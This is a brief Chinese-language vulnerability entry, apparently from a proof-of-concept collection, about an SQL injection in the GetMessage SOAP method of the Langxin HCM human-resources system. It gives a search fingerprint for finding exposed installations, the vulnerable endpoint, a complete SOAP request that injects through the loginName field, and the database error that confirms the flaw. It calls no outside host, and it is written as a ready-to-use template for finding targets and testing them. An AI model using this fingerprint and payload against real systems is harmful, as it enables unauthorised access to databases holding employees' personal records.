# HCM朗新人力资源系统GetMessage存在sql注入漏洞

HCM ｜ SQL注入 ｜ —
- **指纹**：`body="人力资源管理系统"`
- **请求**：`POST /ws/GetFunc_code.asmx HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<GetMessage xmlns="http://tempuri.org/">
<loginName>1</loginName>
</GetMessage>
</soap:Body>
</soap:Envelope>
```
- **响应特征**：200 SqlClient.SqlException: